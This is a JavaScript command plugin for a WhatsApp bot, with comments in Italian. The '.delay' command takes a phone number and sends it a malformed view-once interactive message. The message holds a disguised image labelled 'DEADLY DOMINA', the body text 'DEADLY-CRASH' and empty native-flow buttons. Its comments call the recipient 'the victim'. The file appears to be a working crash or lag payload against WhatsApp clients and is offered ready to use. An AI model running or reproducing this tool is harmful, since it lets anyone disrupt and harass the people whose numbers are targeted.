import { createCanvas } from 'canvas'
import { generateWAMessageFromContent, generateWAMessageContent } from '@realvare/baileys'

let handler = async (m, { conn, text, command }) => {
  if (!text) return m.reply(`📌 Usa così:\n.${command} numero\n\nEsempio:\n.${command} 393471234567`)

  let target = `${text.replace(/[^0-9]/g, '')}@s.whatsapp.net`

  try {
    // Genera immagine camuffata
    const width = 800
    const height = 600
    const canvas = createCanvas(width, height)
    const ctx = canvas.getContext('2d')

    ctx.fillStyle = '#000'
    ctx.fillRect(0, 0, width, height)

    ctx.fillStyle = '#ff0000'
    ctx.font = 'bold 60px Arial'
    ctx.textAlign = 'center'
    ctx.fillText('𝐃𝐄𝐀𝐃𝐋𝐘 𝐃𝐎𝐌𝐈𝐍𝐀', width / 2, height / 2)

    const buffer = canvas.toBuffer()

    // Estrae la funzione di upload corretta dal tuo client Baileys
    const uploadFn = conn.waUploadToServer || conn.logger?.upload || conn.ws?.waUploadToServer

    if (!uploadFn) {
      throw new Error("Funzione 'waUploadToServer' non trovata nell'istanza del bot.")
    }

    // Genera il contenuto multimediale con la funzione di upload estratta
    let prepared = await generateWAMessageContent(
      { image: buffer },
      { upload: uploadFn }
    )

    // Crea il payload del messaggio interattivo (Native Flow)
    let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: true,
              imageMessage: prepared.imageMessage
            },
            body: {
              text: "𝐃𝐄𝐀𝐃𝐋𝐘-𝐂𝐑𝐀𝐒𝐇"
            },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({}),
              buttons: [
                { 
                  name: "single_select", 
                  buttonParamsJson: JSON.stringify({ title: "Select", sections: [] }) 
                },
                { 
                  name: "call_permission_request", 
                  buttonParamsJson: JSON.stringify({}) 
                }
              ]
            }
          }
        }
      }
    }, { userJid: conn.user?.id || conn.user?.jid })

    // Invia il pacchetto relay alla vittima
    await conn.relayMessage(target, msg.message, { messageId: msg.key.id })

    m.reply(`✅ Foto camuffata inviata a ${text}`)
  } catch (e) {
    console.error(e)
    m.reply("❌ Errore durante l'invio: " + e.message)
  }
}

handler.command = /^delay$/i
export default handler
